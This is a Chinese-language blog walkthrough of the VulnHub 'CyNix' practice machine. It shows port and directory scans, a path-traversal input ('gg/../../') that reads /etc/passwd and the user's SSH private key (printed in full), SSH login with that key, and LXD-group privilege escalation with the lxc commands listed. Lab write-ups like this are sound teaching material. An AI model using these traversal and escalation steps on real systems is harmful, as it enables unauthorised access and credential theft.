---
layout: post
title: "CyNix walkthrough"
date: 2021-07-07
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP              |
| ------------- | --------------- |
| 本机（Win10） | `192.168.1.115` |
| Kali          | `192.168.1.116` |
| CyNix         | `192.168.1.119` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.1.119`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.1.119
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 07:31 UTC
Nmap scan report for 192.168.1.119
Host is up (0.011s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6688/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6d:df:0d:37:b1:3c:86:0e:e6:6f:84:b9:28:11:ee:68 (RSA)
|   256 8f:3e:c0:08:03:13:e8:64:89:f6:f9:63:b3:88:99:2a (ECDSA)
|_  256 fb:e3:40:e6:91:0b:3c:bc:b7:0e:c7:bd:ef:a2:93:fc (ED25519)
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

结果显示靶机开启**80**端口和进行ssh服务的**6688**端口，那么下一步进行目录枚举

```shell
┌──(root💀kali)-[~]
└─# gobuster dir -u http://192.168.1.119/ -w /usr/share/wordlists/Passwords/Leaked_Databases/rockyou.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.119/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Passwords/Leaked_Databases/rockyou.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/07 04:24:19 Starting gobuster in directory enumeration mode
===============================================================
Progress: 5100 / 14344392 (0.04%)[ERROR] 2021/07/07 04:24:29 [!] parse "http://192.168.1.119/!@#$%^": invalid URL escape "%^"
/lavalamp             (Status: 301) [Size: 317] [--> http://192.168.1.119/lavalamp/]
Progress: 19414 / 14344392 (0.14%)
...
```

在*gobuster*工具扫描结果中显示存在*/lavalamp*目录，并且在Chrome Devtools工具中查看源码时发现在*/lavalamp/skin/default.css*样式表中的注释发现可疑内容：

```css
/*
#1 = 85b0be
#2 = 95cbdd
*/
```

此外在*/lavalamp/contactform/contactform.js*文件中发现HTML是将表格内容提交到*/lavalamp/canyoubypassme.php*中。对该页面进行代码审计，修改*table*样式中*opacity*的属性值为 *1.0;*，这样就可以在页面中看到一个提交表格。

![1]({{ '/cynix/1.png' | prepend: site.url }})

虽然提示说输入的内容应为数值，不过可以想到这里是需要我们进行命令注入。经过测试，当输入的内容是URI时会返回源码，猜测执行的命令类似于*curl_exec()*函数；当输入的内容是路径时返回*You are not allowed to do that.*，在多次尝试后发送*gg/../../etc/passwd*时会返回其内容。

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
ford:x:1000:1000:ford,,,:/home/ford:/bin/bash
lxd:x:106:65534::/var/lib/lxd/:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
```

在其中发现靶机存在一个用户名为*ford*,使用该用户名登录到ssh服务时返回**Permission denied (publickey)**，因此该用户需要私钥进行登录。

```shell
┌──(root💀kali)-[~/CTF]
└─# ssh ford@192.168.1.119 -p 6688
 _____  _    _  ____  ______ _   _ _______   __
|  __ \| |  | |/ __ \|  ____| \ | |_   _\ \ / /
| |__) | |__| | |  | | |__  |  \| | | |  \ V /
|  ___/|  __  | |  | |  __| | . ` | | |   > <
| |    | |  | | |__| | |____| |\  |_| |_ / . \
|_|    |_|  |_|\____/|______|_| \_|_____/_/ \_\


ford@192.168.1.119: Permission denied (publickey).
```

### 获取私钥登录ssh

传递参数*file*的值为*gg/../../home/ford/.ssh/id_rsa*，得到该用户的私钥：

```shell
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAk1VUtcYuZmM1Zmm4yNpguzzeocGpMVYC540yT90QqaD2Bsal
zYqvHKEh++bOL6QTSr0NjU9ifT/lBIVSIA0TpjUTkpdIW045H+NlgMhN0q/x6Yy2
LofuB4LQqRzr6cP0paoOYNq1KYG3QF1ouGa4k1i0td4DepBxcu4JBMOm20E7BurG
zo41f/YWjC5DurNjIchzl4GyBClMGSXWbIbr6sYwVx2OKyiPLFLYusrNqwJNQvxz
Mf5yolEYI8WOXJzCfiPQ5VG8KXBH3FHu+DhFNgrJQjgowD15ZMQ1qpO/2FMhewR6
gcDs7rCLUUXc9/7uJ7e3zHlUyDgxakYohn3YiQIDAQABAoIBAE/cfSJa3mPZeuSc
gfE9jhlwES2VD+USPljNDGyF47ZO7Y0WuGEFv43BOe6VWUYxpdNpTqM+WKCTtcwR
iEafT/tT4dwf7LSxXf2PAUIhUS3W+UYjY80tGTUxD3Hbn3UDJuV1nH2bj3+ENJTL
DSyHYZ1dA/dg9HnHOfeWV4UhmJxXmOAOKgU9Z73sPn4bYy4B3jnyqWn392MsQftr
69ZYauTjku9awpuR5MAXMJ9bApk9Q7LZYwwGaSZw8ceMEUj7hkZBtP9W9cilCOdl
rFXnkc8CvUpLh+hX6E/JOCGsUvdPuVLWKd2bgdK099GrRaenS8SlN0AUTfyNiqg4
VE7V8AECgYEAwoGVE+Z8Tn+VD5tzQ0twK+cP2TSETkiTduYxU3rLqF8uUAc3Ye/9
TLyfyIEvU7e+hoKltdNXHZbtGrfjVbz6gGuGehIgckHPsZCAQLPwwEqp0Jzz9eSw
qXI0uM7n2vSdEWfCAcJBc559JKZ5uwd0XwTPNhiUqe6DUDUOZ7kI34ECgYEAwenM
gMEaFOzr/gQsmBNyDj2gR2SuOYnOWfjUO3DDleP7yXYNTcRuy6ke1kvMhf9fWw7h
dq3ieU0KSHrNUQ9igFK5C8FvsB+HUyEjfVpNhFppNpWUUWKDRCypbmypLg0r+9I7
myrdBFoYv30WKVsEHus1ye4nJzKjCtkgmjYMfQkCgYA0hctcyVNt2xPEWCTC2j8b
C9UCwSStAvoXFEfjk/gkqjcWUyyIXMbYjuLSwNen0qk3J1ZaCAyxJ8009s0DnPlD
7kUs93IdiFnuR+fqEO0E7+R1ObzC/JMb3oQQF4cSYBV92rfPw8Xq07RVTkL21yd8
dQ8DO5YBYS/CW+Fc7uFPgQKBgHWAVosud792UQn7PYppPhOjBBw+xdPXzVJ3lSLv
kZSiMVBCWI1nGjwOnsD77VLFC+MBgV2IwFMAe9qvjvoveGCJv9d/v03ZzQZybi7n
KVGp91c8DEPEjgYhigl/joR5Ns3A9p1vu72HWret9F/a5wRVQqK5zL/Tzzgjmb3Y
QnkBAoGAVosEGOE7GzBMefGHjQGMNKfumeJ01+Av6siAI6gmXWAYBaU618XhFEh1
+QNoLgWvSXoBuN+pMkxnRCfMTNbD1wSk46tW3sWHkZdV31gKceOifNzMVw53bJHP
/kto0eGJ/vgM0g9eyqmcpPTVqf7EwkJdo0LngOprNyTk+54ZiUg=
-----END RSA PRIVATE KEY-----
```

使用私钥进行登录：

```shell
┌──(root💀kali)-[~]
└─# chmod 600 ford_rsa
┌──(root💀kali)-[~]
└─# ll ford_rsa
-rw------- 1 root root 1676 Jul  7 05:14 ford_rsa
┌──(root💀kali)-[~]
└─# ssh ford@192.168.1.119 -p 6688 -i ford_rsa
load pubkey "ford_rsa": invalid format
 _____  _    _  ____  ______ _   _ _______   __
|  __ \| |  | |/ __ \|  ____| \ | |_   _\ \ / /
| |__) | |__| | |  | | |__  |  \| | | |  \ V /
|  ___/|  __  | |  | |  __| | . ` | | |   > <
| |    | |  | | |__| | |____| |\  |_| |_ / . \
|_|    |_|  |_|\____/|______|_| \_|_____/_/ \_\


Last login: Fri Nov  8 16:46:44 2019 from 10.80.3.41
ford@blume:~$
```

在该目录下得到第一个flag：

```shell
ford@blume:~$ ls
user.txt
ford@blume:~$ cat user.txt
02d6267ed96e6b615b031dafe9607151
```

### 提权

在通过`id`查看用户*ford*权限时，发现该用户所属组中有*lxd*，因此可通过[这篇文章](https://www.hackingarticles.in/lxd-privilege-escalation/)进行LXD提权。

```shell
ford@blume:~$ id
uid=1000(ford) gid=1000(ford) groups=1000(ford),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),113(lxd)
```

操作步骤有：

```shell
lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

最后就可以得到*root*下的最后一个flag。

### 总结

1. ssh私钥登录：`ssh ford@192.168.1.119 -p 6688 -i ford.rsa`
2. [lxd提权](https://www.hackingarticles.in/lxd-privilege-escalation/)

